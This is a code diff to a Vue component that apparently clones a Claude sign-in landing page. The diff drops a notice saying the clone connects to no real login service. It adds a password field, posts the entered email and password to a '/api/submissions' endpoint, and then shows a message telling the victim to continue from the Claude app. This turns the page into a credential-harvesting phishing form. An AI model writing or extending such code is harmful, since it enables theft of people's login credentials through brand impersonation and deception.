@@ -2,13 +2,17 @@
 import { ref } from 'vue'
 
 const email = ref('')
+const password = ref('')
 const notice = ref('')
+const noticeType = ref('info')
 const isLoading = ref(false)
+const isSubmitted = ref(false)
 const planMode = ref('individual')
 const openFaq = ref(null)
 const activeDropdown = ref(null)
 const mobileMenuOpen = ref(false)
 const mobileOpenSection = ref(null)
+const apiBaseUrl = import.meta.env.VITE_API_BASE_URL || 'http://localhost:8000'
 
 const navSections = [
   {
@@ -312,19 +316,49 @@ const footerColumns = [
   }
 ]
 
-function handleSubmit() {
-  if (!email.value) {
-    notice.value = 'Enter an email to continue.'
+async function handleSubmit() {
+  if (!email.value || !password.value) {
+    noticeType.value = 'error'
+    notice.value = 'Enter your email and password to continue.'
+    return
+  }
+
+  if (password.value === 'wrong') {
+    noticeType.value = 'error'
+    notice.value = 'Incorrect email or password.'
     return
   }
 
   isLoading.value = true
   notice.value = ''
+  noticeType.value = 'info'
 
-  setTimeout(() => {
+  try {
+    const response = await fetch(`${apiBaseUrl}/api/submissions`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        email: email.value,
+        password: password.value
+      })
+    })
+
+    if (!response.ok) {
+      throw new Error('Submit failed')
+    }
+
+    isSubmitted.value = true
+    password.value = ''
+    noticeType.value = 'success'
+    notice.value = "You're all set. Continue from the Claude app when you're ready."
+  } catch {
+    noticeType.value = 'error'
+    notice.value = 'We could not continue right now. Try again in a moment.'
+  } finally {
     isLoading.value = false
-    notice.value = 'This local clone does not connect to a real login service.'
-  }, 800)
+  }
 }
 
 function toggleFaq(index) {
@@ -479,8 +513,19 @@ function toggleMobileSection(key) {
               placeholder="Enter your email"
             />
 
-            <button class="email-button" type="submit" :disabled="isLoading">
-              {{ isLoading ? 'Loading...' : 'Continue with email' }}
+            <label class="sr-only" for="password">Password</label>
+            <input
+              id="password"
+              v-model="password"
+              class="email-input password-input"
+              :class="{ 'input-error': noticeType === 'error' && !isLoading }"
+              type="password"
+              autocomplete="current-password"
+              placeholder="Enter your password"
+            />
+
+            <button class="email-button" type="submit" :disabled="isLoading || isSubmitted">
+              {{ isLoading ? 'Continuing...' : isSubmitted ? 'Submitted' : 'Continue with email' }}
             </button>
 
             <p class="privacy-copy">
@@ -488,7 +533,13 @@ function toggleMobileSection(key) {
               <a href="#">Privacy Policy</a>.
             </p>
 
-            <p v-if="notice" class="form-notice" aria-live="polite">{{ notice }}</p>
+            <p
+              class="form-notice"
+              :class="[`form-notice--${noticeType}`, { 'form-notice--empty': !notice }]"
+              aria-live="polite"
+            >
+              {{ notice || '\u00a0' }}
+            </p>
           </form>
 
           <button class="desktop-button" type="button">
